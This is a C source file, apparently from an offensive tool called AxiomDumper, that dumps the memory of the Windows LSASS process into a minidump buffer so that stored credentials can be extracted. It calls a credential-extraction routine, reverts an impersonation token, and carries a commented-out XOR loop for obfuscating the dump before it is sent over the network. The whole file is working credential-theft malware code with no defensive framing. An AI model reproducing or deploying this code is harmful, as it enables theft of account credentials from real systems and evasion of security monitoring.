#include <stdio.h>
#include "AxiomDumper.h"
#include "SSN_Hashes.h"

#define MEMORY_BUFFER_SIZE_MB 256

BOOL El_Sass(HANDLE hProcess, const void** bufferAddress, int* bytesReadAddress)
{
    BOOL isDumped = FALSE;
    HANDLE hThread = GetCurrentThread();
    LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * MEMORY_BUFFER_SIZE_MB);

    SIZE_T regionSize = DUMP_MAX_SIZE;
    DUMPCONTEXT dc = {};

    //dc.Signature = 0x00000000;
    dc.Signature = 0x504d444d;
    //dc.Version = 0x0000;
    dc.Version = 0xa793;
    dc.ImplementationVersion = 0;
    dc.hProcess = hProcess;
    dc.BaseAddress = dumpBuffer;
    dc.rva = 0;
    dc.DumpMaxSize = DUMP_MAX_SIZE;
    printf("Invoke Credzotron\n");

    // Dump creds and immediatly revert the process' impersonation token
    isDumped = ELSASS_ExtractAllCredz(&dc);
    SetThreadToken(&hThread, NULL);

    if (isDumped)
    {
        *bufferAddress = dc.BaseAddress;
        *bytesReadAddress = dc.rva;

        int j = 0;
        const char xorkey[] = "Mah-Key";
        char* modifiableBuffer = (char*)dc.BaseAddress;
        for (int i = 0; i < dc.rva; i++)
        {
            if (j == strlen("Mah-Key") - 1)
                j = 0;
            //Uncomment below if you want to XOR data before sending over network
            //modifiableBuffer[i] = modifiableBuffer[i] ^ xorkey[j];
            j++;
        }

        return (true);
    }
    return (false);
}
